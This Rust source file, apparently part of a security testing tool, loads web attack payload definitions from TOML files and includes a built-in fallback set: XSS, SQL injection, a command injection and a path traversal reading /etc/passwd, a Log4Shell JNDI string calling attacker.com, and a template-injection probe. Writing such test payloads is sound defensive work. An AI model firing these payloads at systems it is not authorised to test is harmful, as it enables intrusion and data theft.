//! External payload loader
//!
//! Loads payload definitions from TOML files, with fallback to built-in defaults.

use serde::{Deserialize, Serialize};
use std::path::Path;
use anyhow::Result;

/// Payload definition structure matching TOML format
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct PayloadDefinition {
    pub id: String,
    pub name: String,
    pub category: String,
    pub pattern: String,
    pub description: String,
    pub risk_level: String,
    #[serde(default)]
    pub cwe_id: Option<String>,
    #[serde(default)]
    pub owasp_category: Option<String>,
    #[serde(default)]
    pub mitre_attack_id: Option<String>,
}

/// TOML file structure
#[derive(Debug, Clone, Serialize, Deserialize)]
struct PayloadFile {
    payloads: Vec<PayloadDefinition>,
}

/// Payload loader with fallback support
pub struct PayloadLoader;

impl PayloadLoader {
    /// Load payloads from a directory of TOML files
    pub fn load_from_directory(dir: &Path) -> Result<Vec<PayloadDefinition>> {
        let mut all_payloads = Vec::new();

        if !dir.exists() {
            tracing::debug!("Payload directory does not exist: {}", dir.display());
            return Ok(all_payloads);
        }

        tracing::info!("Loading payloads from directory: {}", dir.display());

        for entry in std::fs::read_dir(dir)? {
            let entry = entry?;
            let path = entry.path();

            if path.extension().is_some_and(|ext| ext == "toml") {
                tracing::debug!("Loading payload file: {}", path.display());

                match std::fs::read_to_string(&path) {
                    Ok(content) => {
                        match toml::from_str::<PayloadFile>(&content) {
                            Ok(file) => {
                                tracing::info!(
                                    "Loaded {} payloads from {}",
                                    file.payloads.len(),
                                    path.file_name().unwrap_or_default().to_string_lossy()
                                );
                                all_payloads.extend(file.payloads);
                            }
                            Err(e) => {
                                tracing::warn!(
                                    "Failed to parse TOML file {}: {}",
                                    path.display(),
                                    e
                                );
                            }
                        }
                    }
                    Err(e) => {
                        tracing::warn!("Failed to read file {}: {}", path.display(), e);
                    }
                }
            }
        }

        tracing::info!("Total payloads loaded: {}", all_payloads.len());
        Ok(all_payloads)
    }

    /// Load payloads with fallback to built-in defaults
    ///
    /// Tries the following in order:
    /// 1. Custom directory (if provided)
    /// 2. Default `./payloads/` directory
    /// 3. Built-in payloads (minimal fallback set)
    pub fn load_with_fallback(custom_dir: Option<&Path>) -> Vec<PayloadDefinition> {
        // Try custom directory first
        if let Some(dir) = custom_dir {
            if let Ok(payloads) = Self::load_from_directory(dir) {
                if !payloads.is_empty() {
                    tracing::info!("Using {} payloads from custom directory", payloads.len());
                    return payloads;
                }
            }
        }

        // Try default location: ./payloads/
        let default_dir = Path::new("payloads");
        if let Ok(payloads) = Self::load_from_directory(default_dir) {
            if !payloads.is_empty() {
                tracing::info!("Using {} payloads from default directory", payloads.len());
                return payloads;
            }
        }

        // Fall back to built-in payloads
        tracing::warn!("No external payloads found, using built-in defaults");
        Self::built_in_payloads()
    }

    /// Get payloads filtered by category
    pub fn get_by_category(
        payloads: &[PayloadDefinition],
        category: &str,
    ) -> Vec<PayloadDefinition> {
        payloads
            .iter()
            .filter(|p| p.category == category)
            .cloned()
            .collect()
    }

    /// Get payloads filtered by risk level
    pub fn get_by_risk_level(
        payloads: &[PayloadDefinition],
        min_risk: &str,
    ) -> Vec<PayloadDefinition> {
        let risk_order = ["NONE", "LOW", "MEDIUM", "HIGH", "CRITICAL"];
        let min_index = risk_order
            .iter()
            .position(|&r| r == min_risk)
            .unwrap_or(0);

        payloads
            .iter()
            .filter(|p| {
                risk_order
                    .iter()
                    .position(|&r| r == p.risk_level)
                    .map(|idx| idx >= min_index)
                    .unwrap_or(false)
            })
            .cloned()
            .collect()
    }

    /// Built-in payloads as fallback (minimal essential set)
    fn built_in_payloads() -> Vec<PayloadDefinition> {
        vec![
            // Essential XSS payloads
            PayloadDefinition {
                id: "xss-001".to_string(),
                name: "Basic Script Tag".to_string(),
                category: "XSS".to_string(),
                pattern: "<script>alert('XSS')</script>".to_string(),
                description: "Simple XSS using script tags".to_string(),
                risk_level: "HIGH".to_string(),
                cwe_id: Some("CWE-79".to_string()),
                owasp_category: Some("A03:2021".to_string()),
                mitre_attack_id: None,
            },
            PayloadDefinition {
                id: "xss-002".to_string(),
                name: "Image onerror Event Handler".to_string(),
                category: "XSS".to_string(),
                pattern: "<img src=x onerror=alert('XSS')>".to_string(),
                description: "XSS using event handlers".to_string(),
                risk_level: "HIGH".to_string(),
                cwe_id: Some("CWE-79".to_string()),
                owasp_category: Some("A03:2021".to_string()),
                mitre_attack_id: None,
            },
            // Essential SQLi payloads
            PayloadDefinition {
                id: "sqli-001".to_string(),
                name: "Basic SQL Injection".to_string(),
                category: "SQLInjection".to_string(),
                pattern: "' OR '1'='1".to_string(),
                description: "Classic SQL injection".to_string(),
                risk_level: "HIGH".to_string(),
                cwe_id: Some("CWE-89".to_string()),
                owasp_category: Some("A03:2021".to_string()),
                mitre_attack_id: None,
            },
            PayloadDefinition {
                id: "sqli-002".to_string(),
                name: "Union-based SQL Injection".to_string(),
                category: "SQLInjection".to_string(),
                pattern: "1' UNION SELECT NULL,NULL,NULL--".to_string(),
                description: "UNION-based data extraction".to_string(),
                risk_level: "HIGH".to_string(),
                cwe_id: Some("CWE-89".to_string()),
                owasp_category: Some("A03:2021".to_string()),
                mitre_attack_id: None,
            },
            // Essential Command Injection payloads
            PayloadDefinition {
                id: "cmdi-001".to_string(),
                name: "Semicolon Command Injection".to_string(),
                category: "CommandInjection".to_string(),
                pattern: "; cat /etc/passwd".to_string(),
                description: "Unix command injection".to_string(),
                risk_level: "CRITICAL".to_string(),
                cwe_id: Some("CWE-78".to_string()),
                owasp_category: Some("A03:2021".to_string()),
                mitre_attack_id: None,
            },
            // Essential Path Traversal payload
            PayloadDefinition {
                id: "path-001".to_string(),
                name: "Basic Path Traversal".to_string(),
                category: "PathTraversal".to_string(),
                pattern: "../../../etc/passwd".to_string(),
                description: "Directory traversal attack".to_string(),
                risk_level: "HIGH".to_string(),
                cwe_id: Some("CWE-22".to_string()),
                owasp_category: Some("A01:2021".to_string()),
                mitre_attack_id: None,
            },
            // Essential Log4Shell payload
            PayloadDefinition {
                id: "l4s-001".to_string(),
                name: "Log4Shell JNDI LDAP".to_string(),
                category: "Log4Shell".to_string(),
                pattern: "${jndi:ldap://attacker.com/a}".to_string(),
                description: "Log4j RCE via JNDI".to_string(),
                risk_level: "CRITICAL".to_string(),
                cwe_id: Some("CWE-917".to_string()),
                owasp_category: Some("A03:2021".to_string()),
                mitre_attack_id: None,
            },
            // Essential SSTI payload
            PayloadDefinition {
                id: "ssti-001".to_string(),
                name: "Template Injection".to_string(),
                category: "SSTI".to_string(),
                pattern: "{{7*7}}".to_string(),
                description: "Server-side template injection".to_string(),
                risk_level: "HIGH".to_string(),
                cwe_id: Some("CWE-1336".to_string()),
                owasp_category: Some("A03:2021".to_string()),
                mitre_attack_id: None,
            },
        ]
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::fs;
    use tempfile::TempDir;

    #[test]
    fn test_load_from_directory() {
        let temp_dir = TempDir::new().unwrap();
        let toml_content = r#"
[[payloads]]
id = "test-001"
name = "Test Payload"
category = "XSS"
pattern = "<script>test</script>"
description = "Test payload"
risk_level = "HIGH"
cwe_id = "CWE-79"
owasp_category = "A03:2021"
"#;

        let file_path = temp_dir.path().join("test.toml");
        fs::write(&file_path, toml_content).unwrap();

        let payloads = PayloadLoader::load_from_directory(temp_dir.path()).unwrap();
        assert_eq!(payloads.len(), 1);
        assert_eq!(payloads[0].id, "test-001");
        assert_eq!(payloads[0].category, "XSS");
    }

    #[test]
    fn test_built_in_payloads() {
        let payloads = PayloadLoader::built_in_payloads();
        assert!(!payloads.is_empty());
        assert!(payloads.iter().any(|p| p.category == "XSS"));
        assert!(payloads.iter().any(|p| p.category == "SQLInjection"));
        assert!(payloads.iter().any(|p| p.category == "CommandInjection"));
    }

    #[test]
    fn test_get_by_category() {
        let payloads = PayloadLoader::built_in_payloads();
        let xss_payloads = PayloadLoader::get_by_category(&payloads, "XSS");
        assert!(!xss_payloads.is_empty());
        assert!(xss_payloads.iter().all(|p| p.category == "XSS"));
    }

    #[test]
    fn test_get_by_risk_level() {
        let payloads = PayloadLoader::built_in_payloads();
        let critical = PayloadLoader::get_by_risk_level(&payloads, "CRITICAL");
        assert!(critical.iter().all(|p| p.risk_level == "CRITICAL"));

        let high_and_above = PayloadLoader::get_by_risk_level(&payloads, "HIGH");
        assert!(!high_and_above.is_empty());
    }
}
